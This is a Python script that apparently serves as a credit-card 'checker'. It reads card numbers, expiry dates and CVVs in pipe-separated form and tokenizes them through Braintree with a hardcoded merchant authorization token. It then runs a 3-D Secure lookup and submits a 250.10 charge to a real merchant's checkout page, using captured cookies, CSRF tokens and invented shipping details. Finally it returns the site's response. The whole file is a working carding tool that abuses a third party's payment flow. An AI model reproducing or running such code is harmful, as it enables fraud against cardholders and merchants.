import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDM1MjIxOTEsImp0aSI6ImE0MGY5M2U0LTNkZTktNGViOS1hODQyLWJhZDdiOGIwYWE0NSIsInN1YiI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.DLKkU4kehqreGb5X7cVLn70Qm1n5qHX8G9eSeAEkdgOmkEgMpEf3oudnmQ9LPhASVWHCrb4UwpzreepR3Xipig',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '170cf5c6-92fa-4d31-b9d5-bb901ef8877a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	token=(response.json()['data']['tokenizeCreditCard']['token'])
	import requests
	
	headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
	    'content-type': 'application/json',
	    'origin': 'https://www.pro-fly.eu',
	    'referer': 'https://www.pro-fly.eu/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'amount': 250.1,
	    'additionalInfo': {
	        'shippingGivenName': 'jghd',
	        'shippingSurname': 'jekw',
	        'shippingPhone': '7044324458',
	        'shippingLine1': '444 sjwi',
	        'shippingCity': 'NY',
	        'shippingPostalCode': '10012',
	    },
	    'bin': '548274',
	    'dfReferenceId': '0_b4b6b8ba-9cc5-4712-9c51-913dad87915f',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.70.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 24,
	        'issuerDeviceDataCollectionTimeElapsed': 11311,
	        'issuerDeviceDataCollectionResult': False,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDM1MjIxOTEsImp0aSI6ImE0MGY5M2U0LTNkZTktNGViOS1hODQyLWJhZDdiOGIwYWE0NSIsInN1YiI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.DLKkU4kehqreGb5X7cVLn70Qm1n5qHX8G9eSeAEkdgOmkEgMpEf3oudnmQ9LPhASVWHCrb4UwpzreepR3Xipig',
	    'braintreeLibraryVersion': 'braintree/web/3.70.0',
	    '_meta': {
	        'merchantAppId': 'www.pro-fly.eu',
	        'platform': 'web',
	        'sdkVersion': '3.70.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': '170cf5c6-92fa-4d31-b9d5-bb901ef8877a',
	    },
	}
	
	response = requests.post(
	    f'https://api.braintreegateway.com/merchants/2x54tghx83669n36/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	nonce=(response.json()['paymentMethod']['nonce'])
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.945343702.1703435327',
	    'cookie_consent': 'True',
	    'shopping_cart': 'eyJwayI6NzA3MSwicXVhbnRpdHkiOjEsIm9yZGVyIjpudWxsfQ:1rHRQp:nZbBAFFCEwD-9eOcXeYIOBnpDFc',
	    'csrftoken': 'FXhXeSaEsfm2bVdOWvrGN1CLpCYQsfeh1gy3ytyQL8HoC8J09EYZ3pYYb8GxxY3s',
	    '_ga_CJN3B8R3NX': 'GS1.1.1703435327.1.1.1703435793.0.0.0',
	}
	
	headers = {
	    'authority': 'www.pro-fly.eu',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': '_ga=GA1.1.945343702.1703435327; cookie_consent=True; shopping_cart=eyJwayI6NzA3MSwicXVhbnRpdHkiOjEsIm9yZGVyIjpudWxsfQ:1rHRQp:nZbBAFFCEwD-9eOcXeYIOBnpDFc; csrftoken=FXhXeSaEsfm2bVdOWvrGN1CLpCYQsfeh1gy3ytyQL8HoC8J09EYZ3pYYb8GxxY3s; _ga_CJN3B8R3NX=GS1.1.1703435327.1.1.1703435793.0.0.0',
	    'origin': 'https://www.pro-fly.eu',
	    'referer': 'https://www.pro-fly.eu/cart/payment/card/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'csrfmiddlewaretoken': 'N55gTSUGqOep2tjc8LpdmzYucjiZmVS39ommdtiSJHzLtGPolUWwCXkHYP0GrEHe',
	    'amount': '250.10',
	    'nonce': nonce,
	}
	
	response = requests.post('https://www.pro-fly.eu/cart/payment/card/', cookies=cookies, headers=headers, data=data)
	reu=(response.text)
	pattern = re.compile(r'<li>(.*?)<\/li>')
	match = pattern.search(reu)
	extracted_text = match.group(1)
	return (extracted_text)
	